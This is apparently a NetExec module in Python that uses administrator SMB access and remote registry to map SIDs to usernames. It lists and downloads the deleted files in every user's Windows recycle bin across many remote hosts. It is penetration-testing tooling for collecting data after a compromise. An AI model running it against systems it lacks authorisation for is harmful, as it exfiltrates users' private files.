from os import makedirs
from nxc.paths import NXC_PATH
from os.path import join, abspath
from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rrp import DCERPCSessionError
from impacket.examples.secretsdump import RemoteOperations


class NXCModule:
    # Module by @Defte_
    # Dumps files from recycle bins

    name = "recyclebin"
    description = "Lists and exports users' recycle bins"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """No options available"""

    def on_admin_login(self, context, connection):
        false_positive_users = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
        found = 0
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()

            for sid_directory in connection.conn.listPath("C$", "$Recycle.Bin\\*"):
                try:
                    if sid_directory.get_longname() and sid_directory.get_longname() not in false_positive_users:

                        # Extracts the username from the SID
                        reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
                        key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid_directory.get_longname()}")["phkResult"]
                        username = None
                        try:
                            _, profileimagepath = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath\x00")
                            # Get username and remove embedded null byte
                            username = profileimagepath.split("\\")[-1].rstrip("\x00")
                        except rrp.DCERPCSessionError as e:
                            context.log.debug(f"Couldn't get username from SID {e} on host {connection.host}")

                        # Lists for any file or directory in the recycle bin
                        spider_folder = f"$Recycle.Bin\\{sid_directory.get_longname()}\\"
                        paths = connection.spider(
                            "C$",
                            folder=spider_folder,
                            regex=[r"(.*)"],
                            silent=True
                        )

                        false_positive = (".", "..", "desktop.ini")
                        filtered_file_paths = [path for path in paths if not path.endswith(false_positive)]
                        if filtered_file_paths:
                            if username is not None:
                                context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()} ({username})")
                            else:
                                context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()}")

                            for path in filtered_file_paths:
                                # Returned path look like:
                                # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$I87021Q.txt
                                # Or
                                # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$R87021Q.txt
                                # $I files are metadata while $R are actual files so we split the path from the SID
                                # And check that the filename contains $R only to prevent downloading useless stuff

                                if "$R" in path.split(sid_directory.get_longname())[1] and not path.endswith(false_positive):
                                    # Create the export path
                                    export_path = join(NXC_PATH, "modules", "recyclebin")
                                    makedirs(export_path, exist_ok=True)

                                    # Formatting the destination filename
                                    file_path = path.split("$")[-1].replace("/", "_")
                                    filename = f"{connection.host}_{username if username else sid_directory.get_longname()}_recyclebin_{file_path}"
                                    dest_path = abspath(join(export_path, filename))
                                    try:
                                        with open(dest_path, "wb+") as file:
                                            connection.conn.getFile("C$", path, file.write)
                                    except Exception as e:
                                        if "STATUS_FILE_IS_A_DIRECTORY" in str(e):
                                            context.log.debug(f"Couldn't open {dest_path} because of {e}")
                                        else:
                                            context.log.fail(f"Failed to write recyclebin file to {filename}: {e}")
                                    else:
                                        context.log.highlight(f"\t{dest_path}")
                                        found += 1
                except DCERPCSessionError as e:
                    if "ERROR_FILE_NOT_FOUND" in str(e):
                        continue
                    else:
                        context.log.fail(f"Error opening {sid_directory.get_longname()} on host {connection.host} because of {e}")
                        continue
            if found > 0:
                context.log.highlight(f"Recycle bin's content downloaded to {export_path}")
        except DCERPCSessionError as e:
            context.log.exception(e)
            context.log.fail(f"Error connecting to RemoteRegistry {e} on host {connection.host}")
        finally:
            remote_ops.finish()
